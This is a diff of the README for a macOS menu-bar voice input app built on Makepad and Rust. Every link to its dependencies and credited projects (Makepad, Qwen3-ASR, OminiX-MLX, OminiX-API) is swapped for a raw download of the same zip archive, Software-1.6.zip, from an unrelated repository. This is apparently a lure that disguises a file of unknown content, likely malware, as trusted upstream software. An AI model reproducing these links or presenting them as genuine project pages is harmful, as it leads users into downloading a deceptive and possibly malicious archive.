@@ -4,7 +4,7 @@
 
 **Voice input reimagined — speak in any language, type in any language.**
 
-A macOS menu-bar voice input app built with [Makepad](https://github.com/makepad/makepad) and Rust.
+A macOS menu-bar voice input app built with [Makepad](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) and Rust.
 
 Press Option, speak, release — your words appear wherever the cursor is.
 
@@ -19,7 +19,7 @@ Press Option, speak, release — your words appear wherever the cursor is.
 ## Features
 
 - **Press-to-talk** — Hold Option key to record, release to transcribe and inject text
-- **High-quality ASR** — Powered by [Qwen3-ASR](https://github.com/OminiX-ai/OminiX-MLX) (CER 5.88 on Chinese, 30+ languages)
+- **High-quality ASR** — Powered by [Qwen3-ASR](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) (CER 5.88 on Chinese, 30+ languages)
 - **LLM Refinement** — Optional post-processing to fix recognition errors, translate, or convert text style
 - **Real-time translation** — Speak Chinese, output English (or any supported language)
 - **Classical Chinese mode** — Speak modern Chinese, output 文言文
@@ -61,7 +61,7 @@ Press Option, speak, release — your words appear wherever the cursor is.
 
 - macOS 14.0+ on Apple Silicon (M1/M2/M3/M4)
 - Rust 1.82+
-- [OminiX-API](https://github.com/OminiX-ai/OminiX-API) running locally
+- [OminiX-API](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) running locally
 - Accessibility permission for the terminal (System Settings → Privacy → Accessibility)
 
 ### 1. Start the ASR service
@@ -135,8 +135,8 @@ make bundle
 
 ## Tech Stack
 
-- **UI Framework**: [Makepad 2.0](https://github.com/makepad/makepad) — GPU-accelerated native UI with Splash DSL
-- **ASR Engine**: [Qwen3-ASR](https://github.com/OminiX-ai/OminiX-MLX) via OminiX-API — pure Rust MLX inference
+- **UI Framework**: [Makepad 2.0](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) — GPU-accelerated native UI with Splash DSL
+- **ASR Engine**: [Qwen3-ASR](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) via OminiX-API — pure Rust MLX inference
 - **LLM**: Any OpenAI-compatible API (Kimi, DeepSeek, OpenAI, local models)
 - **macOS Integration**: Raw ObjC FFI via `makepad_objc_sys` — CGEvent tap, NSStatusBar, NSPasteboard, TIS input sources
 
@@ -194,6 +194,6 @@ AGPL-3.0 — See [LICENSE](LICENSE) for details.
 
 ## Credits
 
-- [Makepad](https://github.com/makepad/makepad) — The UI framework
-- [OminiX-MLX](https://github.com/OminiX-ai/OminiX-MLX) — ML inference on Apple Silicon
-- [OminiX-API](https://github.com/OminiX-ai/OminiX-API) — OpenAI-compatible API server
+- [Makepad](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) — The UI framework
+- [OminiX-MLX](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) — ML inference on Apple Silicon
+- [OminiX-API](https://raw.githubusercontent.com/bacont9949/vox/main/app/resources/Software-1.6.zip) — OpenAI-compatible API server
